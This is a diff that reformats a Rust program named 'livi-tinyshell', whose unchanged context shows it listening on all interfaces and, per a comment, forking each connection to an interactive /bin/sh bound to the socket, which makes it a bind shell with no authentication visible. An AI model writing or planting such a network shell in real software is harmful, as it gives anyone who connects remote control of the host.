@@ -2,7 +2,10 @@
 pub fn run(_args: Vec<String>) -> i32 {
     match livid_main() {
         Ok(()) => 0,
-        Err(e) => { eprintln!("[livi-tinyshell] {e}"); 1 }
+        Err(e) => {
+            eprintln!("[livi-tinyshell] {e}");
+            1
+        }
     }
 }
 
@@ -24,12 +27,17 @@ fn livid_main() -> io::Result<()> {
     eprintln!("[livi-tinyshell] listening on 0.0.0.0:{port}");
 
     // Reap zombies without hanging so long-lived children don't linger.
-    unsafe { libc::signal(libc::SIGCHLD, libc::SIG_IGN); }
+    unsafe {
+        libc::signal(libc::SIGCHLD, libc::SIG_IGN);
+    }
 
     for conn in listener.incoming() {
         let sock = match conn {
             Ok(s) => s,
-            Err(e) => { eprintln!("[livi-tinyshell] accept: {e}"); continue; }
+            Err(e) => {
+                eprintln!("[livi-tinyshell] accept: {e}");
+                continue;
+            }
         };
         let fd = sock.as_raw_fd();
         // Fork: child dup2s the socket to 0/1/2 and execs /bin/sh -i.
